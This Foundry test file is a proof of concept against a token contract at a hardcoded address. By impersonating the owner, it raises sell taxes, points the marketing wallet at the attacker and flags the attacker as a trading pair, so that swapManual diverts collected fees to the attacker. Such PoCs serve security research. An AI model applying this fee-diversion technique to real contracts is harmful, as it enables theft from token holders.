// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function sync() external;
}

interface CoinToken {
    function owner() external view returns (address);
    function rewardToken() external view returns (address);
    function _marketingWalletAddress() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setMarketingWallet(address payable wallet) external;
    function setAutomatedMarketMakerPair(address pair, bool value) external;
    function swapManual() external;
    function setSelTaxes(uint256 liquidity, uint256 rewardsFee, uint256 marketingFee, uint256 deadFee) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xa79C1D3A0F0a21eC5B0Ee2f96685aaCfaCc95dFb;
    address attacker = address(this);
    CoinToken private token;
    address private owner;
    address private rewardToken;
    address private secondaryAddress = makeAddr("secondary");
    uint256 private transferAmount = 1_000_000 * 1e18;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = CoinToken(payable(TARGET));
        owner = token.owner();
        rewardToken = token.rewardToken();

        // Fund a secondary address with tokens to perform the fake sell
        vm.prank(owner);
        token.transfer(secondaryAddress, transferAmount);

        // Provide liquidity for the swap in swapManual() to prevent reverts
        IUniswapV2Router02 router = token.uniswapV2Router();
        address wbnb = router.WETH();
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());

        // 1. Liquidity for CoinToken <-> WBNB
        address coinTokenWbnbPair = factory.getPair(address(token), wbnb);
        deal(address(token), coinTokenWbnbPair, 5_000_000_000 * 1e18);
        deal(wbnb, coinTokenWbnbPair, 1000 ether);
        IUniswapV2Pair(coinTokenWbnbPair).sync();

        // 2. Liquidity for WBNB <-> rewardToken (CAKE)
        address cakeWbnbPair = factory.getPair(wbnb, rewardToken);
        deal(wbnb, cakeWbnbPair, 1000 ether);
        deal(rewardToken, cakeWbnbPair, 5_000_000 * 1e18);
        IUniswapV2Pair(cakeWbnbPair).sync();

        // Provide the target contract with some ETH in case it needs to add liquidity itself
        deal(TARGET, 10 ether);

        // Ensure attacker starts with 0 reward tokens for a clean profit calculation
        deal(rewardToken, attacker, 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        vm.startPrank(owner);
                // Set sell fees: 0% liquidity, 0% rewards, 25% marketing, 0% dead
                token.setSelTaxes(0, 0, 25, 0);
                token.setMarketingWallet(payable(attacker));
                token.setAutomatedMarketMakerPair(attacker, true);
                vm.stopPrank();

                // From a secondary address, transfer tokens to the attacker address.
                // Because the attacker is now a 'pair', this is treated as a sell and fees are collected.
                vm.startPrank(secondaryAddress);
                token.transfer(attacker, transferAmount);
                vm.stopPrank();

                // As the owner, call swapManual().
                // This will swap the collected fees (in CoinToken) for the rewardToken and
                // send the marketing portion to the marketing wallet (now the attacker).
                vm.startPrank(owner);
                token.swapManual();
                vm.stopPrank();
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

